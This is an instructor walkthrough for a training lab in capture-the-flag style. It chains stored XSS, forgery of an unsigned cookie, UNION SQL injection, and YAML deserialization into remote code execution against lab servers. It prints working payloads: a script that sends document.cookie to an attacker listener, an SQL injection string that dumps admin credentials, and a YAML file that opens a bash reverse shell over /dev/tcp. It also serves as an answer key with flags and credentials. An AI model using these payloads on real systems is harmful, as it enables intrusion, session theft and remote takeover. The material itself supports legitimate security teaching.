# LAB2 – SYNAPSE Intelligence Corp – Walkthrough (Instructor Reference)

**Difficulty:** Medium  
**Flags:** 3  
**Vulnerabilities:** Stored XSS, Broken Authentication, UNION SQLi, Broken Access Control, YAML Insecure Deserialization  
**OWASP:** A01, A03, A07, A08

---

## Prerequisites

- Parrot attacker node running with static IP `10.0.40.5/24`
  - SSH: `sshpass -p L4b2 ssh lab2@10.0.40.5`
- Server-A SYNAPSE Portal running: `http://192.168.30.10`
- Server-B DataVault running: `http://192.168.30.20`

### Configure Parrot static IP (run at session start)

```bash
nmcli con mod "Wired connection 1" \
  ipv4.method manual \
  ipv4.addresses 10.0.40.5/24 \
  ipv4.gateway 10.0.40.1 \
  ipv4.dns 10.0.40.1 \
  ipv4.ignore-auto-dns yes
nmcli con up "Wired connection 1"
ip a  # verify 10.0.40.5/24
```

---

## Phase 1 — Stored XSS + Cookie Theft

The `/comments` endpoint renders comments without sanitisation (`{{ c.body | safe }}`).  
The victim bot (Playwright) visits `/comments` every ~20 seconds as user `guest`.  
The session cookie is issued without `HttpOnly`, so it is accessible from JavaScript.

**Step 1.1 — Start HTTP listener on Parrot:**

```bash
python3 -m http.server 8000
```

**Step 1.2 — Log in as guest and post XSS payload:**

Login at `http://192.168.30.10/login` with `guest / guest123`.  
Navigate to `/comments` and submit:

```html
<script>fetch('http://10.0.40.5:8000/?c='+encodeURIComponent(document.cookie))</script>
```

**Step 1.3 — Wait for victim cookie:**

Within ~20 seconds the HTTP listener receives:

```
GET /?c=session%3D1%3Aguest%3Aguest HTTP/1.1
```

The bot's cookie arrives but we already know it — the key insight is that the cookie format is `ID:ROLE:USERNAME` with no signature.

---

## Phase 2 — Broken Authentication (Cookie Forgery)

Because the cookie is not signed, we can forge any identity.

**Step 2.1 — Forge admin cookie in browser console:**

```javascript
document.cookie = "session=1:admin:admin; path=/"
```

**Step 2.2 — Verify access:**

Refresh any page — the header now shows "Logged in as: admin (admin)".  
The `/portal` and `/search` routes are now accessible.

---

## Phase 3 — UNION SQL Injection → FLAG #1

The `/search?q=` endpoint concatenates user input directly into a SQL query.  
SQL errors are displayed in the browser.

**Step 3.1 — Confirm injection:**

```
http://192.168.30.10/search?q='
```

Error confirms injection. The `reports` table has 5 columns.

**Step 3.2 — Dump `admin_users` table:**

```
http://192.168.30.10/search?q=' UNION SELECT 1,username,password,flag,5 FROM admin_users--
```

Result:
```
FLAG{synapse_sqli_creds_dumped}
```

**FLAG #1 captured: `FLAG{synapse_sqli_creds_dumped}`**

---

## Phase 4 — Admin Panel → FLAG #2 + Server-B Credentials

With the forged admin cookie, navigate to `/admin`.

**Step 4.1:**

```
http://192.168.30.10/admin
```

The panel shows the classified intelligence database. One entry contains:

```
FLAG{synapse_admin_classified_accessed}
operator / D4t4V4ult#2024  [DataVault at 192.168.30.20]
```

**FLAG #2 captured: `FLAG{synapse_admin_classified_accessed}`**

---

## Phase 5 — YAML Insecure Deserialization → Reverse Shell → FLAG #3

Server-B runs the SYNAPSE DataVault (`http://192.168.30.20`).  
The `/preview/<filename>` route deserialises YAML using `yaml.UnsafeLoader`, which allows  
arbitrary Python object instantiation via the `!!python/object/apply:` tag.

**Step 5.1 — Start netcat listener on Parrot:**

```bash
nc -lvnp 4444
```

**Step 5.2 — Create malicious YAML payload:**

```bash
cat > exploit.yml << 'EOF'
!!python/object/apply:os.system
- "bash -c 'bash -i >& /dev/tcp/10.0.40.5/4444 0>&1'"
EOF
```

**Step 5.3 — Login and upload:**

1. Browse to `http://192.168.30.20/login`
2. Login: `operator / D4t4V4ult#2024`
3. Upload `exploit.yml` via the upload form

**Step 5.4 — Trigger deserialization:**

Click **Preview** on `exploit.yml`. The YAML is loaded with `UnsafeLoader`,  
`os.system()` is called, and the reverse shell connects to Parrot.

**Step 5.5 — Exfiltrate the final flag:**

```bash
# In the reverse shell:
cat /app/data/finalData.txt
```

Output includes company financial data and:

```
FLAG{synapse_nexus_exfil_complete}
```

**FLAG #3 captured: `FLAG{synapse_nexus_exfil_complete}`**

---

## Summary

| Phase | Vulnerability | OWASP | Flag |
|-------|--------------|-------|------|
| 1 | Stored XSS + cookie theft | A03 / A07 | — |
| 2 | Broken authentication (unsigned cookie) | A07 | — |
| 3 | UNION SQL Injection | A03 | FLAG{synapse_sqli_creds_dumped} |
| 4 | Broken access control (admin panel) | A01 | FLAG{synapse_admin_classified_accessed} |
| 5 | YAML insecure deserialization → RCE | A08 | FLAG{synapse_nexus_exfil_complete} |

---

## Key learning points

1. **Attack chaining** — no single vulnerability gives the final flag; each step unlocks the next.
2. **Unsigned session tokens** — any cookie/token without HMAC or JWT signature can be forged by the client.
3. **`yaml.load()` without SafeLoader** — equivalent to `eval()` on the YAML content; always use `yaml.safe_load()`.
4. **Defence in depth** — even if SQLi is fixed, the unsigned cookie allows admin access; even if auth is fixed, the XSS allows cookie theft.
